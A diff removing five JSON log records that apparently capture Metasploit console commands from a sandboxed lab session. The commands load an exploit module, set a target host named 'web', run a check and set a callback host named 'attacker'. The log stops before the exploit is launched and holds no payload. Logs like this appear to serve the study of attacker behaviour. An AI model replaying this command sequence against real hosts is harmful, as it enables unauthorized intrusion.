@@ -1,5 +1,0 @@
-{"sandbox_id": "184", "timestamp_str": "2019-12-12T10:45:05.0+02:00", "cmd_type": "msf-command", "cmd": "use exploit/47230"}
-{"sandbox_id": "184", "timestamp_str": "2019-12-12T10:45:13.0+02:00", "cmd_type": "msf-command", "cmd": "show options"}
-{"sandbox_id": "184", "timestamp_str": "2019-12-12T10:45:32.0+02:00", "cmd_type": "msf-command", "cmd": "set RHOST web"}
-{"sandbox_id": "184", "timestamp_str": "2019-12-12T10:45:35.0+02:00", "cmd_type": "msf-command", "cmd": "check"}
-{"sandbox_id": "184", "timestamp_str": "2019-12-12T10:46:38.0+02:00", "cmd_type": "msf-command", "cmd": "set LHOST attacker"}
